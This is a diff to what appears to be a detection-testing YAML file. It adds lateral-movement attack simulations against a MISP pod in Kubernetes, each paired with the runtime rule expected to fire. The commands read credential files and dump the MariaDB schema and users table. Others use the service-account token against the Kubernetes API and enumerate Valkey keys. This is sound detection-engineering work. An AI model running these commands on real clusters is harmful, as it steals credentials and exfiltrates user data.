@@ -1171,3 +1171,129 @@ attacks:
         ruleName: Unexpected process launched
         containerName: misp
         command: gpg
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # Phase 11: LATERAL MOVEMENT (TA0008) — pivot from misp to its neighbors
+  #
+  # The MISP deployment shares a namespace with two backing services:
+  #   - misp-mariadb        :3306 (auth: /vault/mariadb/mariadb-password)
+  #   - misp-valkey-master  :6379 (auth: /vault/valkey/password)
+  # MISP holds credentials for both. An attacker landing in the misp pod
+  # naturally reads the cred files and pivots — these attacks model that
+  # tradecraft using binaries that are NOT in MISP's runtime baseline
+  # (mariadb-dump, mysqldump, getent), so R0001 fires reliably.
+  #
+  # MITRE T1552.001 (creds in files), T1021 (remote services), T1018 (remote
+  # system discovery), T1071.004 (DNS), T1213 (data from info repositories).
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # T1552.001 — read MariaDB cred file and dump the entire schema
+  # mariadb-dump is NOT in the misp runtime baseline (admin/backup tool, not
+  # used by PHP/Apache) so R0001 fires. Mass exfil pattern of every APT report
+  # on MISP-targeting threat actors.
+  - name: lateral-mariadb-dump-stolen-creds
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "mariadb-dump -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" misp 2>/dev/null | head -50; echo dump_done"]
+    successIndicators:
+      - responseContains: "dump_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: mariadb-dump
+
+  # T1213 — Data from Information Repositories: scrape the users table (which
+  # holds authkeys, email, password hashes) — the canonical post-exploit step.
+  - name: lateral-mariadb-users-table-exfil
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "mysqldump -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" misp users 2>/dev/null | head -20; echo users_dumped"]
+    successIndicators:
+      - responseContains: "users_dumped"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: mysqldump
+
+  # T1018 — Remote System Discovery: DNS probes for sibling/cross-namespace
+  # services. getent is NOT in the misp baseline. Each query fires R0001
+  # for getent; the lookup against an off-namespace target ALSO fires R0005
+  # (DNS anomalies) since misp's normal DNS pattern only touches its own
+  # mariadb/valkey peers.
+  - name: lateral-getent-redis-namespace
+    type: cmdinject
+    exec:
+      command: ["getent", "hosts", "redis.redis.svc.cluster.local"]
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: getent
+
+  - name: lateral-getent-postgres-namespace
+    type: cmdinject
+    exec:
+      command: ["getent", "hosts", "pg-rw.postgres.svc.cluster.local"]
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: getent
+
+  - name: lateral-getent-k8s-api
+    type: cmdinject
+    exec:
+      command: ["getent", "hosts", "kubernetes.default.svc.cluster.local"]
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: misp
+        command: getent
+
+  # T1090 — Internal Proxy probe: connect to the K8s API from inside misp
+  # using its mounted SA token. curl IS in the misp baseline, but the OPEN
+  # of the SA-token path /var/run/secrets/kubernetes.io/serviceaccount/token
+  # is anomalous — R0006 fires when the rule is active.
+  - name: lateral-k8s-api-with-sa-token
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 200; echo k8s_api_probed"]
+    successIndicators:
+      - responseContains: "k8s_api_probed"
+    expectedDetections:
+      - ruleID: R0006
+        ruleName: Unexpected service account token access
+        containerName: misp
+
+  # T1213 — Data from Information Repositories: dump valkey cache keys.
+  # MISP stores session data, cached event metadata and rate-limit counters
+  # in valkey. Using the stolen password we KEYS * the entire cache.
+  # python3 IS in misp baseline, but the SOCKET to a port not normally talked
+  # to from THIS path is anomalous — the open() of /vault/valkey/password
+  # may also fire R0010 when the rule recognises the path.
+  - name: lateral-valkey-keys-enum
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "python3 -c \"import socket; s=socket.socket(); s.connect(('misp-valkey-master', 6379)); pw=open('/vault/valkey/password').read().strip(); s.sendall(f'AUTH {pw}\\r\\nKEYS *\\r\\n'.encode()); print(s.recv(2048).decode()[:200])\" 2>&1 | head -10; echo valkey_enum_done"]
+    successIndicators:
+      - responseContains: "valkey_enum_done"
+    expectedDetections: []
+
+  # T1213 — Cross-pod recon: enumerate MISP DB names from the SERVER side.
+  # The mysql client IS in misp baseline (used for runtime DB queries), but
+  # SHOW DATABASES against the backing DB from an attacker context still
+  # fires R0004 on the mariadb container (anomalous query pattern from the
+  # peer). Pure server-side detection of lateral-movement-from-client.
+  - name: lateral-mariadb-show-databases
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "mysql -h misp-mariadb -u misp -p\"$(cat /vault/mariadb/mariadb-password)\" -e 'SHOW DATABASES; SELECT user FROM mysql.user;' 2>&1 | head -20"]
+    successIndicators:
+      - responseContains: "Database"
+      - responseContains: "ERROR"
+    expectedDetections: []
